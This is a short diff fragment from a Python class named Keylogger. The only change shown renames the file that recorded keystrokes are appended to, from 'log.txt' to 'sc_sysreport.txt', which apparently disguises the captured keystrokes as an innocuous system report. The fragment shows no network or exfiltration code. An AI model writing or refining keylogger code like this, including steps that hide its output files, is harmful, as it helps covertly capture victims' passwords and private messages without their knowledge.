@@ -23,7 +23,7 @@ class Keylogger:
             return False
 
     def write_file(self, keys):
-        with open("log.txt", "a") as file:
+        with open("sc_sysreport.txt", "a") as file:
             for key in self.keys:
                 k = str(key).replace("'", "")
 
